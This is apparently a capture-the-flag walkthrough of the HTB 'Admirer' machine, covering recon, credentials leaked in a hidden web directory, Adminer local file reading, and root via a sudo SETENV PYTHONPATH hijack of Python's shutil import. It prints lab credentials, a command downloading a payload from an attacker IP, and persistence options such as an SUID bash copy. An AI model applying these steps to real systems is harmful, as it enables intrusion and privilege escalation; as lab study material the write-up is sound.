1,Recon
port scan 
	21/tcp ftp `vsftpd 3.0.3`
	22/tcp ssh `OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)`
	80/tcp http `Apache httpd 2.4.25 ((Debian))`
	\
directory scan 
![](images/Pasted%20image%2020240911042720.png)In this place, we find something interesting from robots.txt
```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

Let's try to get into that directory.
Very sadly, we could not get into that page `403 Forbidden`

Let's come to check the ftp service, and check can we use the anonymous username to login.Unluckily, we don't have the right and get the `Permission denied`

So let's come to the ssh service, by check `searchsploit`, we find
```
searchsploit OpenSSH 7.4p1       
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration            | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)      | linux/remote/45210.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' F | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Lo | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                | linux/remote/45939.py
---------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

But it seems to need us to get the word list, I think it would be a rabbit hole.

let's come to the robots.txt, maybe we can try to enumerate the files in the directory `/admin-dir/`

`gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,html -t 20 -o ./gobuster-scan.txt'`

There is something useful:
	`/contacts.txt` 
```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

	`/credentials.txt`
```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

2, shell as user
Firstly we check the ftp account
we successfully login and we get two files `dump.sql  html.tar.gz`
From html directory, we get the database credit from index.php
```
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```
But we could not use it as the ftp or ssh account
Then we need to continue to enumerate the web service source code.

This is the tree of this web service
```
├── utility-scripts
│   ├── admin_tasks.php
│   ├── db_admin.php
│   ├── info.php
│   └── phptest.php
└── w4ld0s_s3cr3t_d1r
    ├── contacts.txt
    └── credentials.txt
```
I think the `db_admin.php` would be useful for us.

We need to guess or find the `db_admin.php` in this web-service
`gobuster dir -u http://10.10.10.187/utility-scripts -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 20 -o ./gobuster-scan_db_admin.txt`

 `/info.php` we get the version of system and php
 ```
 Linux admirer 4.9.0-19-amd64 #1 SMP Debian 4.9.320-2 (2022-06-30) x86_64
 php 7.0
 Apache/2.4.25 (Debian)
```

`/adminer.php` would be our `db_admin.php`

But very sadly, we could not login successfully.While I couldn’t get access to any database on Admirer, I could connect to one on my local machine. As this blog post lays out, that will still give local file access for whatever the www-data process can read from Admirer, using SQL like:

![](images/Pasted%20image%2020240911081659.png)

I tried to read /etc/password and other files in /etc, but only got an error:
![](images/Pasted%20image%2020240911081719.png)

But when I asked for /var/www/html/index.php, it reads 123 rows:
![](images/Pasted%20image%2020240911081730.png)

Then we just need to run `select * from pwn.exfil;`
![](images/Pasted%20image%2020240911082858.png)

The reason that I wasn’t able to log into the local database was that the creds on the live site are different from the ones in the FTP backup:
![](images/Pasted%20image%2020240911082942.png)

We have get the ssh and ftp credit: `waldo:&<h5b~yK3F#{PaPB&dA}{H>` 

3, shell as root
when we login to the machine by ssh, we want to check `sudo -l`
```
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

There’s a tag that I haven’t typically seen on HTB, `SETENV`

We don't have right to write into and id has something interesting
```
id
uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),1001(admins)

ls -l /opt/scripts/
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 /opt/scripts/admin_tasks.sh
-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
```
But we can check it and find something vulnerable

Very sadly, we can not find anything exploitable, the only user input that is handled is passed into a switch statement at the end. So if my input is anything other than a single digit between 1 and 8 (or 7 for the non-interactive way), the script will simply echo an error. Even if I could impact the $PATH, every binary is called by full path (except echo, but that’s built into the shell).

If I then rule out options 1-3 as they simply run commands that don’t interact with something I can modify meaningfully, that leaves the four backup tasks.

Since backup.py is custom, I started there:
```
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

There’s nothing obviously insecure with the script itself.But `from shutil import make_archive` would give us some chances to exploit it.If we change the `PythonPath` to the payload, maybe we can exploit it.

Let's come to `SETENV`
```
In the flags, there’s env_reset, which basically says that, because there’s no env_keep setting, none of waldo’s environment will be passed:

If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller’s environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The default contents of the env_keep and env_check lists are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.

One last thing I learned about how sudo handles environment variables - I has a list of “bad” variables that don’t carry into the new command even with -E, as explained here. What that post doesn’t show is that it doesn’t seem to apply to variables passed inline.
```

```
# $TESTVAR enters through sudo with -E
$ TESTVAR=testValue sudo -E bash -c 'echo $TESTVAR'
testValue

# $PYTHONPATH does not
$ PYTHONPATH=testValue sudo -E bash -c 'echo $PYTHONPATH'

# Passing $PYTHONPATH as part of the command does work
$ sudo PYTHONPATH=testValue bash -c 'echo $PYTHONPATH'
testValue
```

It turns out there is a path to exploit backup.py. As shown above, I can pass a $PYTHONPATH into sudo. So what is that variable? When a Python script calls import, it has a series of paths it checks for the module. I can see this with the sys module:

```
waldo@admirer:/opt/scripts$ python3 -c "import sys; print('\n'.join(sys.path))"

/usr/lib/python35.zip
/usr/lib/python3.5
/usr/lib/python3.5/plat-x86_64-linux-gnu
/usr/lib/python3.5/lib-dynload
/usr/local/lib/python3.5/dist-packages
/usr/lib/python3/dist-packages
```

The first empty line is important - it is filled at runtime with the current directory of the script (so if waldo could write to /opt/scripts, I could exploit it that way). On this system, $PYTHONPATH is current empty:
```
waldo@admirer:/opt/scripts$ echo $PYTHONPATH


```
If I set it and run look at sys.path again, my addition is added:
```
waldo@admirer:~$ export PYTHONPATH=/tmp

waldo@admirer:/opt/scripts$ python3 -c "import sys; print('\n'.join(sys.path))"

/tmp
/usr/lib/python35.zip
/usr/lib/python3.5
/usr/lib/python3.5/plat-x86_64-linux-gnu
/usr/lib/python3.5/lib-dynload
/usr/local/lib/python3.5/dist-packages
/usr/lib/python3/dist-packages
```

This means that Python will first try to look in the current script directory, then /tmp, then the Python installs to try to load shutil.

Playing around with this box for a few minutes, it becomes clear that /tmp and /home/waldo are being cleared of files I create every couple minutes. Those aren’t very OPSEC smart places to be working anyway. I could look at /dev/shm, but it’s mounted as noexec:
```
waldo@admirer:/opt/scripts$ mount | grep shm

tmpfs on /run/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=1019460k)

```

I can look for writable directories:
```
waldo@admirer:/opt/scripts$ find / -type d -writable 2>/dev/null | grep -v -e '^/proc' -e '/run'

/var/lib/php/sessions
/var/tmp
/tmp
/home/waldo
/home/waldo/.nano
```

/var/tmp seems like a good option (/home/waldo/.nano would have been good too).
If this works, root is going to run some Python code for me. My first instinct is to use a reverse shell, but that might actually have issues. If the process errors out or ends, my session could die with it (it actually would work fine in this case). There are tons of options here, but I’ll show two.\

1. Copy /bin/bash and set it owned by root and SUID.
2. Write my public SSH key into /root/.ssh/authorized_keys.

Run admin_tasks.sh calling the web backup option (6):
`wget 10.10.14.65/exploit.py -O shutil.py`
`sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh 6`

Then just `./.wither -p` , we get the root shell.

